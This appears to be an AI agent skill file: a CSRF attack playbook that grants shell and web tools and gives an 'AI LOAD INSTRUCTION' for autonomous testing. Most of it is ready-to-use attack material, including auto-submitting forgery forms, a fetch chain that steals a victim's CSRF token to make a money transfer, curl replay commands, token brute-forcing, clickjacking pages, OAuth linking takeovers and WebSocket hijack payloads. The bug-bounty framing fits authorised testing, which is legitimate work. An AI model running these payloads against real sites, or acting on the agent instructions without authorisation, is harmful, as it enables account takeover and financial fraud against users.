---
name: csrf
description: CSRF attack playbook — token bypass techniques, SameSite cookie bypass, JSON CSRF, multipart CSRF, CORS-based CSRF, CSPT2CSRF (client-side path traversal), clickjacking as CSRF, OAuth CSRF, and CSRF via subdomain takeover.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: CSRF — Cross-Site Request Forgery Attack Playbook

> **AI LOAD INSTRUCTION**: CSRF exploits the browser's automatic cookie inclusion to forge authenticated requests from the victim's browser. Covers all major CSRF protection bypass techniques including SameSite=Lax bypass, JSON CSRF, CORS misconfig chains, CSPT2CSRF, and OAuth state parameter abuse. Base models miss SameSite=Lax top-level navigation bypass and CSPT2CSRF entirely.

## 0. RELATED ROUTING

- csp-bypass-advanced — if CSP `form-action` is not set, CSRF exfil via form is possible
- open-redirect — combine with OAuth CSRF for token theft
- xss — CSRF becomes trivial when XSS is present

---

## 1. CSRF TOKEN BYPASS TECHNIQUES

### 1.1 Delete or Empty the Token

```http
POST /transfer HTTP/1.1
# Remove token entirely from request
# body: amount=1000&to=attacker
# (no csrf_token parameter at all)
```
Some servers check "if token is present, validate it" — missing token passes.

### 1.2 Use Same Token Across Accounts

```
1. Get valid CSRF token from your own account: TOKEN_A
2. Craft CSRF attack form using TOKEN_A
3. Victim submits → server validates TOKEN_A (which is YOUR token) → may accept
```
Occurs when server validates token exists and is well-formed, but doesn't tie it to session.

### 1.3 Swap Method (GET for POST)

```http
# If endpoint accepts both GET and POST:
GET /api/transfer?amount=1000&to=attacker HTTP/1.1
# CSRF token only required on POST, not GET
```

### 1.4 Change Content-Type

```http
POST /api/transfer HTTP/1.1
Content-Type: text/plain

{"amount":1000,"to":"attacker"}
```
If endpoint checks CSRF only for `application/x-www-form-urlencoded`, switching to `text/plain` bypasses it while still sending JSON.

### 1.5 Referrer-Based Validation Bypass

```
Target checks: if Referer contains "target.com" → valid
Bypass: host at attacker.com/target.com.attacker.com (Referer: https://target.com.attacker.com/)
Or: use null Referer (meta referrer policy, sandboxed iframe)
```

```html
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<form action='https://target.com/transfer' method='POST'>...">
```

### 1.6 Predict/Brute-Force Weak Token

If CSRF token is a short numeric value or timestamp-based:
```python
# Brute force short token: 4-digit = 10000 attempts
for i in range(10000):
    token = str(i).zfill(4)
    r = requests.post(url, data={'csrf': token, 'amount': '1000'})
    if 'success' in r.text: print(f"Token: {token}")
```

---

## 2. SAMESITE COOKIE BYPASS

### SameSite=Lax Bypass

**Rule**: SameSite=Lax blocks cross-site POST but allows cross-site GET for top-level navigation.

```html
<!-- Works: GET top-level navigation -->
<a href="https://target.com/logout" target="_blank">click</a>
<meta http-equiv="refresh" content="0;url=https://target.com/logout">
<script>location='https://target.com/logout'</script>
```

**Two-step attack** (bypass 2-minute Lax exception):
1. Force victim to `GET /login?next=/transfer` — creates new session cookie with SameSite=Lax
2. Within 2 minutes of cookie creation, Lax cookies are sent with cross-site POST (Chrome exception)

### SameSite=Strict Bypass (requires same-site origin)

Requires XSS or open redirect on any same-site subdomain:
```
target.com (strict cookie)
attacker-controlled: other.target.com (XSS or open redirect)

1. Get victim to visit: other.target.com/redirect?url=/transfer?amount=1000
2. Redirect goes to: target.com/transfer?amount=1000
3. Same-site → Strict cookies sent
```

### Subdomain Takeover for SameSite Bypass

Unclaimed subdomain → attacker takes over → now "same-site" with victim:
```
1. Find: subdomain.target.com → CNAME → victim.s3.amazonaws.com (unclaimed)
2. Register the S3 bucket → control subdomain.target.com
3. Host CSRF payload at subdomain.target.com
4. SameSite=Strict cookies included (same eTLD+1)
```

---

## 3. JSON CSRF

When an endpoint accepts JSON and the CORS policy is misconfigured:

### Method 1: `text/plain` with JSON body

```html
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```
Sends `Content-Type: text/plain` with body: `{"email":"attacker@evil.com","ignore":"="}`

If the server parses JSON regardless of Content-Type, it works.

### Method 2: Fetch with CORS Pre-flight (needs CORS misconfiguration)

```html
<script>
fetch('https://target.com/api/update', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```
Only works if `Access-Control-Allow-Origin: *` or reflects origin with `Access-Control-Allow-Credentials: true`.

### Method 3: Flash-based JSON CSRF (legacy)

Historical: Flash allowed arbitrary Content-Type with credentials.

---

## 4. MULTIPART CSRF

```html
<!-- Multipart/form-data doesn't require CSRF token on some endpoints -->
<form action="https://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="data" value='{"admin":true}'>
  <input type="file" name="file">
</form>
```

If JSON data endpoint also accepts multipart, CSRF may bypass token check.

---

## 5. CORS-BASED CSRF (CORS + CSRF CHAIN)

If CORS allows `Access-Control-Allow-Origin: *` on authenticated endpoints:

```html
<script>
// Step 1: Read victim's CSRF token
fetch('https://target.com/account', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    // Step 2: Extract CSRF token from response
    const token = html.match(/csrf_token" value="([^"]+)"/)[1];
    // Step 3: Use token for state-changing request
    return fetch('https://target.com/transfer', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: `amount=1000&to=attacker&csrf_token=${token}`
    });
  });
</script>
```

---

## 6. CSPT2CSRF (CLIENT-SIDE PATH TRAVERSAL TO CSRF)

Path traversal in the client-side routing causes the browser to make a request to a different endpoint.

**Setup**: Application has `fetch('/api/users/' + userId + '/avatar')` where `userId` comes from URL.

```
Victim visits: https://target.com/profile/../../transfer?amount=1000
→ App does: fetch('/api/users/../../transfer?amount=1000/avatar')
→ Resolves to: fetch('/transfer?amount=1000')
→ State-changing request with victim's cookies
```

**Discovery**: Find endpoints where user-controlled path segments are concatenated into fetch/XMLHttpRequest URLs.

---

## 7. CLICKJACKING AS CSRF

When CSRF token is properly protected but clickjacking is possible (missing X-Frame-Options / frame-ancestors):

```html
<style>
  iframe { opacity: 0.1; position: absolute; z-index: 1; width: 300px; height: 100px; }
  #decoy { position: absolute; z-index: 0; width: 300px; height: 100px; }
</style>
<div id="decoy">Click here to win a prize!</div>
<iframe src="https://target.com/transfer?amount=1000&to=attacker"></iframe>
```

The victim clicks the visible "prize" button but actually clicks the invisible iframe button at the same position.

---

## 8. OAUTH CSRF (STATE PARAMETER BYPASS)

### Missing `state` parameter

OAuth flow without `state` parameter → CSRF attack on account linking:

```
1. Attacker starts OAuth flow with their account: attacker clicks "Connect Google"
2. Gets OAuth authorization URL: https://google.com/oauth?client_id=X&redirect_uri=https://target.com/oauth/callback
3. Pauses before clicking "Allow" — grabs the authorization URL
4. Sends this URL to victim
5. Victim visits URL → Google redirects to target.com/callback?code=VICTIM_CODE
6. target.com links victim's account to attacker's Google account
7. Attacker logs in with Google → logs into victim's account
```

### Weak state parameter

```
state = base64(timestamp)   → predictable
state = md5(username)       → enumerable
state = ""                  → no validation
```

### CSRF via redirect_uri manipulation

```
Attacker modifies redirect_uri to their domain:
https://target.com/oauth?redirect_uri=https://attacker.com/steal
→ OAuth code sent to attacker instead of target
```

---

## 9. CSRF VIA SUBDOMAIN XSS

```
1. Find XSS on any subdomain of target.com
2. Host CSRF payload at the XSS endpoint
3. Victim's browser executes CSRF attack from subdomain context
4. SameSite cookies (Lax) are included (same-site = same eTLD+1)
```

---

## 10. CSRF TESTING CHECKLIST

```
□ Check for CSRF token on all state-changing requests (POST/PUT/DELETE/PATCH)
□ Remove token entirely → does request succeed?
□ Empty the token value → still validates?
□ Reuse your own CSRF token in victim's context
□ Switch Content-Type (form → text/plain or application/json)
□ Check SameSite attribute on session cookie
│   ├── SameSite=None → classic CSRF form works
│   ├── SameSite=Lax → try GET-based state changes, top-level navigation
│   └── SameSite=Strict → need same-site XSS or subdomain takeover
□ Check CORS headers → `Access-Control-Allow-Origin` + `Allow-Credentials`
□ Check OAuth flows for missing or weak state parameter
□ Check for CSPT in client-side fetch/XHR with user-controlled paths
□ Check frame-ancestors / X-Frame-Options → clickjacking fallback
```

---

## 11. CSRF PROOF-OF-CONCEPT TEMPLATE

```html
<!DOCTYPE html>
<html>
<body>
<h1>CSRF PoC</h1>
<form id="csrf-form" action="https://TARGET.COM/ACTION" method="POST">
  <input type="hidden" name="param1" value="value1">
  <input type="hidden" name="param2" value="value2">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

**For GET CSRF:**
```html
<img src="https://TARGET.COM/ACTION?param1=value1&param2=value2" width="0" height="0">
```


---

## hunt-csrf — Hunting Methodology (real BB reports)

## Shortcut: a raw HTTP client beats a real cross-origin page for header-check CSRF

A raw HTTP client (curl, Burp Repeater, any scripting client) is not a browser: it will send
whatever `Origin`/`Referer` header VALUE you set, from any path, on the same connection as your
authenticated cookie. Many apps that claim to defend against CSRF only do a naive **string check**
on the incoming `Origin`/`Referer` header (does it contain/equal some expected value?) rather than
real same-origin enforcement — you can satisfy that check directly by setting the header, with no
actual cross-site delivery (hosting an HTML page, a headless browser) required. This is faster and
more reliable than building a real attacker page for this exact pattern:
```
POST /profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Origin: https://a-domain-the-app-treats-as-trusted-or-attacker-controlled.example
Cookie: <authenticated session>

username=csrf_poc
```
If some text names a SPECIFIC origin/domain as the "expected" attacker page, that literal value is
often exactly what the server's check is looking for — try it verbatim in `Origin` (fall back to
`Referer` if `Origin` alone doesn't flip it). Only build a real cross-origin page (actual browser
delivery) when the target does genuine SameSite/fetch-based origin enforcement that a spoofed header
can't satisfy.

## Autonomous Testing Priority

**CSRF only matters on state-changing actions that a browser could be tricked into making cross-site.**

**Testing flow:**
1. **GET the form endpoint** to establish a baseline and check what fields exist (look for hidden `csrf_token`, `authenticity_token`, `_token`, `csrfmiddlewaretoken` fields).
2. **POST the state-changing action without any CSRF token field.** Send only the functional parameters (email, amount, etc.).
3. **Use a "simple-request" Content-Type** — `application/x-www-form-urlencoded`, `multipart/form-data`, OR `text/plain` are the three CORS "simple" content-types a cross-origin form can send with no preflight. A JSON endpoint is CSRF-resistant **only if the server rejects those** — if it also accepts a `text/plain` body (common), craft a `text/plain` payload that parses as valid JSON (see the JSON-CSRF-via-text/plain section). Don't skip a JSON endpoint on the assumption that `application/json` alone is protective.
4. **If the action succeeds (2xx, no "invalid token" error) → CSRF is confirmed.**

**High-value targets (in order of impact):**
- Email/password change → account takeover
- Money transfer or payment → financial fraud
- Admin actions (role assignment, user deletion)
- OAuth social-account linking → persistent ATO

**Token bypass techniques when a token IS present:**
- Omit the token field entirely — some frameworks only validate if the field exists, not if it's absent
- Send an empty value (`_token=`) — some validate format, not presence
- Copy a token from another session — some tokens aren't tied to the session

**Scope:** Don't test CSRF on login forms (no existing session to exploit), logout (no real impact), or read-only GET endpoints.

---

## Crown Jewel Targets

CSRF becomes high-value when it touches **state-changing actions with account-level or financial consequences**. The highest-paying targets are:

- **Account takeover vectors**: OAuth/SSO flows (RelayState manipulation), social account linking/unlinking (Oculus-Facebook, SocialClub), import-friends features that expose OAuth tokens
- **Authentication infrastructure**: Login CSRF, session fixation via CSRF, forced account association
- **API endpoints accepting cross-origin POST**: JSON APIs, heartbeat/activity APIs, anything that skips Content-Type enforcement
- **Third-party integrations**: Grafana, monitoring dashboards, embedded analytics — often lag on CSRF protections
- **Social platforms**: Twitter/X collections, friend imports, social graph mutations — high-volume, authenticated actions with real user impact

**Asset types that pay most:** Core product auth flows > API gateways > third-party integrations running on subdomains > admin panels.

---

## Attack Surface Signals

### URL Patterns
```
/oauth/authorize?RelayState=
/accounts/link
/import/friends
/api/v*/heartbeat
/api/v*/collect
/monitoring/* (Grafana, Prow, Prometheus)
/auth/saml/callback
/connect/* (social integrations)
```

### Response Header Signals
```
# Missing or weak SameSite cookie attributes
Set-Cookie: session=abc123; HttpOnly        # no SameSite = vulnerable
Set-Cookie: session=abc123; SameSite=None   # explicitly allows cross-site

# Missing CSRF headers
# No X-Frame-Options or permissive CORS
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true      # dangerous combo
```

### JS / DOM Patterns
```javascript
// Static or predictable CSRF tokens
meta[name="csrf-token"]   // grep if value changes across sessions
authenticity_token        // Rails — check if reused across page loads

// JSON endpoints without Content-Type enforcement
fetch('/api/heartbeat', {method: 'POST', body: JSON.stringify(data)})

// No CSRF token in form at all
<form method="POST" action="/accounts/link">  // no hidden token field
```

### Tech Stack Signals
- **Rails apps**: Look for `authenticity_token` — test if it's static per session
- **Django apps**: Check `csrfmiddlewaretoken` — test cross-user/session reuse
- **Grafana instances**: CVE-2022-21703 — check version via `/api/health`
- **SAMLv2/OIDC flows**: `RelayState` parameter rarely validated
- **Express/Node APIs**: Often skip CSRF middleware on `/api/*` routes

---

## Step-by-Step Hunting Methodology

1. **Map all state-changing endpoints** — Spider authenticated session, filter for POST/PUT/DELETE/PATCH. Note every form and AJAX call.

2. **Check cookie SameSite attributes** — In DevTools → Application → Cookies. Flag any session cookie without `SameSite=Strict` or `Lax`.

3. **Test token staticness** — Log in twice (different sessions or incognito). Compare `authenticity_token` / `csrfmiddlewaretoken` / `csrf-token` values across:
   - Same session, different page loads (should be different)
   - Different sessions for same user
   - Different users entirely

4. **Test token omission** — Remove the CSRF token field entirely from a POST request. If the server returns 200, you have CSRF.

5. **Test token substitution** — Replace the token with one from a different session. Server accepting it = broken validation.

6. **Test JSON endpoints for form-POST CSRF** — Check if Content-Type is enforced:
   - Send `application/x-www-form-urlencoded` to a JSON endpoint
   - Send `text/plain` with a JSON body
   - If accepted, HTML form can trigger it cross-origin

7. **Hunt OAuth/SSO RelayState** — Intercept SAML/OIDC flows. Test if `RelayState` is validated for same-origin. Inject external URLs.

8. **Check social linking flows** — Every "connect your X account" feature. These often use redirect-based OAuth where CSRF on the callback can associate an attacker's social account.

9. **Test third-party dashboards on subdomains** — Grafana, Kibana, Prometheus. Check version, apply known CVEs, test default CSRF posture.

10. **Build PoC HTML page** — Host on a different origin, fire the request, confirm cookies are sent and action executes.

---

## Payload & Detection Patterns

### Basic CSRF PoC (Form POST)
```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/v1/account/link">
    <input type="hidden" name="provider" value="attacker_account_id" />
    <input type="hidden" name="token" value="oauth_token_here" />
  </form>
</body>
</html>
```

### JSON CSRF via text/plain (bypasses Content-Type check)
```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/heartbeat"
        enctype="text/plain">
    <!-- browser sends: {"status":"ok","x":"=padding"} -->
    <input type="hidden" name='{"status":"ok","x":"' value='padding"}' />
  </form>
</body>
</html>
```

### curl: Test CSRF token omission
```bash
# Capture a valid request, then replay without token
curl -s -X POST https://target.com/settings/email \
  -H "Cookie: session=YOUR_SESSION" \
  -d "email=attacker@evil.com" \
  -v 2>&1 | grep -E "HTTP|location|error"
```

### curl: Test token reuse across sessions
```bash
# Get token from session A
TOKEN_A=$(curl -s https://target.com/settings -H "Cookie: session=SESSION_A" \
  | grep -oP 'authenticity_token[^"]*value="\K[^"]+')

# Use token A in session B's request
curl -s -X POST https://target.com/settings/update \
  -H "Cookie: session=SESSION_B" \
  -d "authenticity_token=$TOKEN_A&email=test@test.com" \
  -v
```

### Grep patterns for recon
```bash
# Find CSRF token fields in HTML responses
grep -Eo 'name="(csrf|_token|authenticity_token|csrfmiddlewaretoken)"[^>]*value="[^"]+"'

# Find forms without CSRF tokens
grep -B5 -A20 '<form method="[Pp][Oo][Ss][Tt]"' response.html | grep -L "csrf\|token\|nonce"

# Check SameSite in response headers
curl -sI https://target.com/login | grep -i "set-cookie"

# Find RelayState parameters
grep -r "RelayState" --include="*.js" .
```

### Grafana CVE-2022-21703 version check
```bash
curl -s https://monitoring.target.com/api/health | jq '.version'
# Vulnerable: < 8.3.5, < 8.4.3, < 7.5.15
```

---

## Common Root Causes

1. **Static CSRF tokens per session** — Developers generate one token at login and reuse it. Airbnb bug: `authenticity_token` was the same across all page loads for a session, making it trivially leakable.

2. **Token not tied to user identity** — Token is valid server-wide or rotates on a schedule, not per-user/session. Mozilla bug: `csrftoken` reusable across users.

3. **Missing token on "secondary" endpoints** — Developers protect login/signup but forget API endpoints, import flows, or webhook handlers.

4. **JSON API assumption of safety** — Belief that `Content-Type: application/json` prevents CSRF. It does via CORS preflight — unless the server also accepts `text/plain` or `application/x-www-form-urlencoded`.

5. **SameSite=None for cross-site embeds** — Developers set `SameSite=None` to support iframe embeds or third-party integrations, inadvertently re-enabling CSRF.

6. **OAuth RelayState not validated** — Developers implement SAML/OIDC but treat `RelayState` as a redirect hint, not a CSRF state parameter requiring cryptographic binding.

7. **Framework misconfiguration** — CSRF middleware excluded for `/api/*` routes in Django/Rails because "API clients don't need it," but browser-based JS clients do.

8. **Third-party software defaults** — Grafana, Kibana, Jenkins shipped with weak or no CSRF protection in older versions; teams don't patch or check.

---

## Bypass Techniques

### Defense: SameSite=Lax cookies
**Bypass:** Top-level navigation GET requests still work. If the sensitive action can be triggered via GET (or if a redirect chain converts POST→GET), Lax doesn't protect it. Also: subdomains can still set cookies for parent domain.

### Defense: CSRF token present
**Bypasses:**
- Token is static per session — steal via XSS, Referer leakage, or cached page
- Token not validated server-side — just remove it and try
- Token validated by length/format only — submit a fake but correctly-formatted value
- Token tied to session but session is predictable

### Defense: `Content-Type: application/json` enforcement
**Bypass:** Use `text/plain` enctype with crafted form input names that produce valid JSON. Server receives JSON body, skips CORS preflight.

### Defense: Referer/Origin header check
**Bypasses:**
- Null Origin: use sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`)
- Subdomain bypass: if `*.target.com` is trusted and you have XSS on any subdomain
- Referer stripping: HTTPS→HTTP transitions strip Referer header
- Weak matching: `target.com.evil.com` passes naive string matching

### Defense: Double-submit cookie pattern
**Bypass:** If attacker can set cookies (subdomain takeover, cookie injection via HTTP), they can set both the cookie and the form field to matching attacker-controlled values.

### Defense: Custom request header (e.g., `X-Requested-With`)
**Bypass:** Simple requests (form POST, `text/plain`) don't trigger preflight and can't set custom headers — but some servers only check for header *presence*, not value, and some frameworks accept requests without it.

---

### Mobile-app CSRF via custom-scheme deeplink
CSRF is not browser-only. For targets with a mobile app, enumerate exported deeplink / custom-scheme handlers (`scheme://action` from the Android manifest / iOS `Info.plist`) and test whether opening one performs a state-changing action (follow, link, purchase) using the app's ambient session with no CSRF token — deliverable to a victim by a plain link or a QR code. Disclosed: reports/583987, reports/805073.

## Gate 0 Validation

1. **What can the attacker DO right now?** — The attacker must be able to trigger a specific state-changing action (account linking, email change, data deletion, social association) on behalf of the victim without any interaction beyond visiting a URL or page.

2. **What does the victim LOSE?** — Identify the concrete harm: account access (ATO), data exposure, financial loss, reputation damage. "A CSRF token is missing" is not impact — "attacker can link their Oculus account to victim's Facebook account, gaining full profile access" is impact.

3. **Can it be reproduced in 10 minutes from scratch?** — You must be able to: (a) create attacker and victim accounts, (b) host a static HTML PoC, (c) have victim visit PoC, (d) confirm the action executed in victim's account — all within 10 minutes with no additional prerequisites.

---

## Real Impact Examples

### Scenario 1: Social Account Takeover via Import Friends (Rockstar Games)
An attacker crafted a malicious page targeting the "Import Friends" OAuth integration. When an authenticated SocialClub user visited the page, the CSRF triggered the OAuth token exchange with an attacker-controlled social account. The victim's SocialClub account became permanently linked to the attacker's Facebook/social identity, enabling full account access without the victim's knowledge. Rated high severity due to complete account compromise path.

### Scenario 2: Facebook Account Hijacking via Oculus Integration CSRF
During Oculus-Facebook account linking, the OAuth callback lacked proper CSRF state validation. An attacker could craft a URL that, when loaded by an authenticated Facebook user who had started the Oculus linking flow, would associate the attacker's Oculus device credentials with the victim's Facebook account. The attacker then had persistent access to the victim's Facebook profile through the Oculus app. The attack required only that the victim click a link while logged into Facebook.

### Scenario 3: JSON API CSRF on Heartbeat/Activity Tracking
A POST endpoint accepting `application/json` was assumed CSRF-safe by developers. A researcher crafted an HTML form using `enctype="text/plain"` with an input name designed to produce syntactically valid JSON when submitted. The browser sent the request cross-origin without a preflight (no custom headers, `text/plain` is a simple request), cookies were attached, and the server processed the JSON body as legitimate — silently logging attacker-controlled activity data under the victim's account identity.

---

## Disclosed Report Citations (Backfill +5 — 2020-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Four cases chain CSRF to full ATO; all five are modern (SameSite-era).

11. **Argo CD — SameSite=Lax bypass via sibling subdomain + Content-Type abuse (CVE-2024-22424)** ([GHSA-92mw-q256-5vwg](https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg) · [Writeup](https://blog.calif.io/p/argo-cd-csrf))
    - Subclass: SameSite=None/Lax misconfig chain — same parent-domain bypass + JSON CSRF via missing Content-Type enforcement
    - Payload: hosted on `marketing.victim.com`, target `argocd.internal.victim.com` → `fetch('https://argocd.internal.victim.com/api/v1/applications', {method:'POST', credentials:'include', body:'{"metadata":{"name":"pwn"},"spec":{"source":{"repoURL":"https://attacker/manifest.git"}}}'})`
    - Root cause: Argo CD did not enforce `Content-Type: application/json`, and SameSite=Lax is moot when the attacker controls any sibling subdomain of the shared parent
    - Year: 2023 reported, fixed Jan 2024 in 2.7.16/2.8.8/2.9.4

12. **GitLab — CSRF on `/api/graphql` via GET-converted mutations** ([H1 #1122408](https://hackerone.com/reports/1122408))
    - Subclass: GET-state-changing endpoint (GraphQL mutations through GET requests)
    - Payload: `<img src="https://gitlab.com/api/graphql?query=mutation{createSnippet(input:{title:%22x%22,visibilityLevel:public,content:%22pwn%22}){snippet{id}}}">`
    - Root cause: backend skipped `X-CSRF-Token` validation when the HTTP method was GET; GraphQL accepted mutations via `?query=mutation{...}` query string
    - Year: 2021 — **$3,370**

13. **Stripe Dashboard — CSRF middleware disabled by code change** ([H1 #1483327](https://hackerone.com/reports/1483327))
    - Subclass: framework misconfiguration — middleware globally disabled
    - Payload: `<form method="POST" action="https://dashboard.stripe.com/account/settings" enctype="text/plain"><input name='{"business_name":"pwned","x":"' value='"}'></form>` + auto-submit script
    - Root cause: 2022-02-14 deploy inadvertently turned off CSRF middleware across all Stripe Dashboard endpoints
    - Year: 2022 — **$5,000** ($2,500 × 2 researchers)

14. **GitHub Enterprise Server — CSRF bypass via path traversal (CVE-2022-23732)** ([H1 #1497169](https://hackerone.com/reports/1497169))
    - Subclass: CSRF token validation bypass (path traversal smuggles request past token check)
    - Payload: `<form method=POST action="https://ghes.victim.com/setup/api/start/..%2f..%2fadmin%2fusers"><input name=login value=attacker></form>`
    - Root cause: router matched the post-traversal path for execution but pre-traversal path for CSRF-protection scope, so the protected endpoint was reached without a valid token
    - Year: 2022 — **$10,000**

15. **HackerOne self — CSRF on social account linking → ATO** ([H1 #1727221](https://hackerone.com/reports/1727221))
    - Subclass: account-link CSRF (social provider attach without state binding)
    - Payload: `<img src="https://hackerone.com/users/social_accounts/google?code=ATTACKER_CODE&state=PREDICTABLE">` — victim's browser completes attacker-initiated link flow
    - Root cause: token bound to OAuth-link callback was either reused across attempts or not user-bound, so attacker-issued link callbacks were accepted on the victim's session — attacker's Google account becomes a valid login path = ATO
    - Year: 2022 — informational scope on H1 self-program, but public PoC

---

## Duende BFF — Role-Partitioned Antiforgery (2024-2026 surface)

Duende BFF (commercial successor to IdentityServer4) is the canonical ASP.NET Core BFF library for SPAs. Its antiforgery primitive is **non-standard and not user-bound**: instead of ASP.NET Core's per-session/per-user double-submit token, Duende only requires the presence of a **static header `X-CSRF: 1`** on every BFF-mapped endpoint. The header value is identical for every caller; it exists only to force a CORS preflight on cross-origin calls. This collapses CSRF defence to "same-origin + session cookie present" — and produces several distinct attack patterns when one BFF serves multiple privilege partitions.

**Architecture primer:** browser↔BFF authenticates via an encrypted HttpOnly session cookie (default `.AspNetCore.Cookies`); BFF↔API uses OAuth tokens cached server-side. Endpoints registered via `MapBffManagementEndpoints` / `MapRemoteBffApiEndpoint` / `MapBffApiEndpoint` enforce `X-CSRF: 1` and session presence — nothing else. ([docs.duendesoftware.com/bff](https://docs.duendesoftware.com/bff/), [Duende blog Mar 2025](https://duendesoftware.com/blog/20250325-understanding-antiforgery-in-aspnetcore))

### Attack class 1 — `X-CSRF: 1` is not user-bound, so cross-role replay succeeds same-origin

When a single BFF serves `/admin/*` and `/user/*` partitions, the antiforgery primitive cannot distinguish role-A from role-B. Any same-origin script that can land an XHR with `X-CSRF: 1` and the victim's session cookie reaches admin endpoints if the victim has the admin role. Stock ASP.NET Core antiforgery (which binds the token to `HttpContext.User.Identity.Name` and rejects on identity change) does the right thing here; Duende BFF does not. ([docs.duendesoftware.com/bff/fundamentals/options](https://docs.duendesoftware.com/bff/fundamentals/options/))

**Payload shape:** from a logged-in low-priv session, `fetch('/bff/admin/users/delete?id=42', {credentials:'include', headers:{'X-CSRF':'1'}})` — succeeds if the victim's session happens to hold the admin role and the attacker can land any same-origin script (self-XSS, subdomain-takeover JS, dependency-confusion).

### Attack class 2 — SignalR/WebSocket carve-out (the `/negotiate` shortcut)

Browser WebSockets cannot send custom headers, so `X-CSRF: 1` cannot be enforced on the upgrade. Developers routinely work around this by **excluding SignalR hub paths from BFF antiforgery** (`MapHub<X>().DisableAntiforgery()` or registering them as non-BFF endpoints). Once excluded, any same-site origin (including a takenover sibling subdomain or a stored-XSS page) can open the WS with the ambient session cookie → CSRF-over-WebSocket to invoke hub methods that mutate state.

**Payload shape:** cross-origin page opens `new WebSocket("wss://bff.example.com/hubs/admin")` — browser sends session cookie, no `X-CSRF` required, attacker invokes `DeleteUser(id)` via standard SignalR JSON frame. ([DuendeArchive/Support#972](https://github.com/DuendeArchive/Support/issues/972), [learn.microsoft.com/aspnet/core/signalr/security](https://learn.microsoft.com/en-us/aspnet/core/signalr/security))

### Attack class 3 — Cookie-domain wildcarding turns subdomain takeover into session fixation

BFF session cookies default to host-only, but developers commonly override with `options.Cookie.Domain = ".example.com"` to share login across `app.example.com` and `admin.example.com`. This drops the `__Host-` prefix protection. Take over `legacy.example.com` (CNAME to deprovisioned Heroku/S3) → set `Set-Cookie: .AspNetCore.Cookies=<attacker_session>; Domain=.example.com` → victim hits `app.example.com` carrying attacker's session = session-fixation ATO. ([nestenius.se BFF cookie hardening](https://nestenius.se/net/bff-in-asp-net-core-3-the-bff-pattern-explained/))

### Evidence strength

No Duende.BFF-direct CVE exists as of 2026-05. The three classes above are **design-level / documented behaviour** that becomes a live finding when paired with a co-resident primitive (same-origin script execution, SignalR carve-out, or subdomain takeover). Report severity should lean on the chain's business impact rather than CVE citation. Adjacent confirmed CVEs in the Duende ecosystem: CVE-2025-26620 (`Duende.AccessTokenManagement` race), CVE-2024-51987 (`Duende.AccessTokenManagement.OpenIdConnect` incorrect-token-after-refresh), CVE-2024-39694 (`Duende.IdentityServer` open redirect). ([Duende advisories on GitHub](https://github.com/advisories?query=duende))

### Hunting checklist

1. `curl https://target/bff/user -H 'X-CSRF: 1' -b '<session>'` — dumps the full claim set including internal IDs, role names, tenant IDs (info disclosure on its own).
2. Inspect `Set-Cookie` on `/bff/login` callback — flag `Domain=` attribute (vs `__Host-` prefix); flag missing `Secure`/`HttpOnly`.
3. From a low-priv session, replay admin-partition POSTs with `X-CSRF: 1` to confirm no per-role token binding.
4. Enumerate SignalR/WS hubs (`/hubs/*`, `/signalr/*`) — open without `X-CSRF`; if 101 Switching Protocols, CSWSH-style attacks viable.
5. Subdomain inventory + DNS-takeover scan for any `*.example.com` if BFF cookie has `Domain=.example.com`.

---

## Related Skills & Chains

- **`hunt-xss`** — Any XSS on a trusted origin neutralizes CSRF defenses (token, SameSite, Origin check) instantly. Chain primitive: XSS reads the `meta[name=csrf-token]` value and same-origin-fetches `/accounts/email` with attacker payload → one-click ATO via attacker-page postMessage triggering the stored XSS to perform the state change.
- **`hunt-auth-bypass`** — CSRF combined with an auth-bypass primitive lets attacker-side scripts perform state changes that should have required step-up auth. Chain primitive: CSRF on `/settings/password` reaches an endpoint that skips the re-auth check → password change executes without the victim ever entering their current password → ATO.
- **`hunt-oauth`** — OAuth/SAML `state`/`RelayState` is structurally a CSRF token; missing validation here is account-linking CSRF. Chain primitive: attacker initiates OAuth on their account, sends victim the `/callback?code=X&state=` URL → victim's logged-in browser completes the link → attacker's social identity now controls victim's account.
- **`security-arsenal`** — Reach for the CSRF PoC templates (form POST, `enctype=text/plain` JSON, sandboxed-iframe null-origin, base64 multipart bypass) before writing one from scratch; also the WAF-bypass header variants for Origin/Referer checks.
- **`triage-validation`** — Run the Pre-Severity Gate before submitting CSRF on a logout endpoint or any action without state-change consequence — those are the canonical N/A traps. Confirm victim LOSES something concrete (account access, money, data), not just "a request executed."

